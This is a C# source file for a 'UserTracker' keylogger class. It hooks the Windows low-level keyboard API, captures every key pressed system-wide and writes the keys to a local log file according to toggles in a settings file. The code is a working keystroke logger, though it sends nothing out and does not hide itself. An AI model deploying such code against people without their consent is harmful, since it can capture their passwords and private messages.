using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace UserTracker
{
    public class KeyLogger
    {
        private static string settingsPath = Path.Combine(Application.StartupPath, "settings.txt");
        private static string logFilePath;
        private static string logModerationFilePath;

        private static LowLevelKeyboardProc proc = HookCallBack;
        private static IntPtr hookId = IntPtr.Zero;
        private static CancellationTokenSource token;

        private static bool isLoggingEnable = false;
        private static bool isKeyLoggingEnable = false;
        private static bool isModerationEnable = false;
        private static bool isKeyModerationEnable = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static void LoadSettings()
        {
            if (File.Exists(settingsPath))
            {
                string[] settings = File.ReadAllLines(settingsPath);

                if (settings.Length >= 7)
                {
                    isLoggingEnable = bool.Parse(settings[0]);
                    isKeyLoggingEnable = bool.Parse(settings[1]);
                    isModerationEnable = bool.Parse(settings[3]);
                    isKeyModerationEnable = bool.Parse(settings[4]);
                    logFilePath = Path.Combine(settings[6], "key_log.txt");
                    logModerationFilePath = Path.Combine(settings[6], "banned_word_log.txt");
                }
            }
        }

        public static async Task StartLoggingAsync()
        {
            if (token != null) return;

            LoadSettings();

            await File.WriteAllTextAsync(logFilePath, string.Empty);
            await File.WriteAllTextAsync(logModerationFilePath, string.Empty);

            token = new CancellationTokenSource();

            await Task.Run(() =>
            {
                hookId = SetHook(proc);
                Application.Run();
            }, token.Token);
        }

        public static void StopLogging()
        {
            if (token == null) return;

            token.Cancel();
            UnhookWindowsHookEx(hookId);
            token = null;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static async Task LogKeyAsync(string key)
        {
            if (isLoggingEnable && isKeyLoggingEnable)
            {
                await File.AppendAllTextAsync(logFilePath, key);
            }
        }

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int kCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)kCode).ToString();

                if (key == "Space") key = " ";
                if (key == "LShiftKey") key = "";
                if (key == "RShiftKye") key = "";

                _ = LogKeyAsync(key);
            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
